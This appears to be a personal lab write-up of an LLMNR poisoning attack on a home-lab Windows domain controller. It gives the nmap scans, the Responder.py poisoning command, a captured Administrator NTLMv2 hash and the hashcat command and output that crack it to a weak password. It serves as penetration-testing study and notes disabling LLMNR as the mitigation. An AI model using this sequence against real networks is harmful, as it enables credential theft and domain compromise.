---
created_date: 02 October 2023
updated_date: 02 October 2023
type: LLMNR testing - Windows
---
###### Links:
[[2 smb_relay_Attack]]
[[3 ipv6_dns_takeover_Attack]]
##### Machine Information
```
Gobots (Attacker)
===============

192.168.146.132 (Warcraft-DC.blizzard.local)
===============
IP Address: 192.168.146.132
Hostname: Warcraft-DC
Credentials: Administrator:Password1

```
##### High-Level Summary

LLMNR is a legacy protocol that can be exploited if you are on the network as an attacker. The only mitigation is to disable LLMNR in GPO. Responder.py pretends to be the existing \\share and gets sent NTLM hashes. Once hashes are received utilize hashcat to crack them.
- 1st: DNS is the first thing that is looked for when looking for drive names, if that fails it tries LLMNR
- 2nd: LLMNR is only utilized if the DNS server doesn't have the existing share drive. If that fails it tries NBTNS
------------
##### Lessons Learned
-  Took me multiple attempts to have hashes dump.

-------------
##### Initial Scanning

- [x] `Ping`
- [ ] `Rustscan`
- [x] `Quick TCP Nmap`
- [x] `Full TCP Nmap`
- [ ] `Full UDP Nmap`
###### Ping
#ping
- Pinging to ensure box is up, get brief OS information.
```bash
ping $ip_address
```
###### Rustscan
#rustscan 
- Typically way faster than nmap, gives very brief port information - but enough to get started while other nmap scripts run.
```bash
rustscan -a $ip_address
```
###### Nmap 
#quick #tcp #nmap 
- Quick Nmap to get initial port information.
```bash
 └─╼ # nmap -sC -sV -Pn 192.168.146.132
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 09:48 EDT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 09:48 (0:00:18 remaining)
Nmap scan report for 192.168.146.132
Host is up (0.0033s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-02 13:48:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLIZZARD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLIZZARD.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
MAC Address: 00:0C:29:7D:99:18 (VMware)
Service Info: Host: WARCRAFT-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-02T13:48:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: WARCRAFT-DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:7d:99:18 (VMware)
```

#full #tcp #nmap 
- Full TCP Nmap to get all port information.
```bash
 └─╼ # nmap -sC -sV -p- -Pn 192.168.146.132
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 09:50 EDT
Nmap scan report for 192.168.146.132
Host is up (0.0015s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-02 13:51:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLIZZARD.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLIZZARD.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:7D:99:18 (VMware)
Service Info: Host: WARCRAFT-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```
###### Initial Scanning Notes:
#initial #scanning #notes
- Generic ports open
-------
##### Responder.py
#sha256sum
```bash
[root💀/usr/share/responder] [192.168.146.129] [2023-10-02 09:41:02] 
 └─╼ # sha256sum Responder.py 
cfb555bb68a8967b158ff8c810456c8249db3ef4edba51c0290787b3114101d8  Responder.py
```
###### Responder.py Setup
#responder
Setting up responder.py to listen on network interface eth0 and conduct LLMNR poisoning
```bash
[root💀/usr/share/responder] [192.168.146.129] [2023-10-02 09:40:33] 
 └─╼ # python3 Responder.py -I eth0 -dwv

-I eth0 = to specify network interface to listen on
-d = Enable answers for NETBIOS DHCP broadcast requests.
-w = Start the WPAD rogue proxy server.
-v = Increase verbosity
```
![[Pasted image 20231002095229.png]]

-----------------------
###### Emulating SMB error
On victim machine (192.168.146.132) typed in share that doesn't exist to entice a poisoning attempt
![[Pasted image 20231002112106.png]]
Received NTLMv2 hash.
```bash
[SMB] NTLMv2-SSP Client   : 192.168.146.132
[SMB] NTLMv2-SSP Username : BLIZZARD\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::BLIZZARD:61dda791d2b97a6d:18E047026899DAE2A7E54B88D6F4E176:0101000000000000009E2DC520F5D901867BA876FE89BF3A00000000020008005A0055003800440001001E00570049004E002D0050004800430035003400430058005200430030004F0004003400570049004E002D0050004800430035003400430058005200430030004F002E005A005500380044002E004C004F00430041004C00030014005A005500380044002E004C004F00430041004C00050014005A005500380044002E004C004F00430041004C0007000800009E2DC520F5D90106000400020000000800300030000000000000000000000000300000E4757F917912F88B9F711E7B5563CF2625C8DF030313F33860C502C2885E11AB0A001000000000000000000000000000000000000900120063006900660073002F00680065006C0070000000000000000000
```
![[Pasted image 20231002112247.png]]

----------------
##### Cracking NTLMv2 Hashes
#hashcat 
- Ran on personal computer with better GPU
```bash
C:\Users\jorde\Documents\Hashcat\hashcat-6.2.6\hashcat-6.2.6>.\hashcat.exe -m 5600 hashes.txt rockyou.txt -o cracked.txt
```

```bash
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::BLIZZARD:61dda791d2b97a6d:18e0470268...000000
Time.Started.....: Mon Oct 02 11:28:49 2023 (0 secs)
Time.Estimated...: Mon Oct 02 11:28:49 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   175.8 MH/s (5.61ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5242880/14344384 (36.55%)
Rejected.........: 0/5242880 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> n1ckos
Hardware.Mon.#1..: Temp: 45c Fan: 53% Util:  0% Core: 261MHz Mem: 403MHz Bus:16

Started: Mon Oct 02 11:28:33 2023
Stopped: Mon Oct 02 11:28:51 2023

C:\Users\jorde\Documents\Hashcat\hashcat-6.2.6\hashcat-6.2.6>type cracked.txt
ADMINISTRATOR::BLIZZARD:61dda791d2b97a6d:18e047026899dae2a7e54b88d6f4e176:0101000000000000009e2dc520f5d901867ba876fe89bf3a0000000002                                                                                                           20008005a0055003800440001001e00570049004e002d0050004800430035003400430058005200430030004f0004003400570049004e002d00500048004300350034                                                                                                           400430058005200430030004f002e005a005500380044002e004c004f00430041004c00030014005a005500380044002e004c004f00430041004c00050014005a0055                                                                                                           500380044002e004c004f00430041004c0007000800009e2dc520f5d90106000400020000000800300030000000000000000000000000300000e4757f917912f88b9f                                                                                                           f711e7b5563cf2625c8df030313f33860c502c2885e11ab0a001000000000000000000000000000000000000900120063006900660073002f00680065006c00700000                                                                                                           000000000000000:Password1
```
![[Pasted image 20231002113128.png]]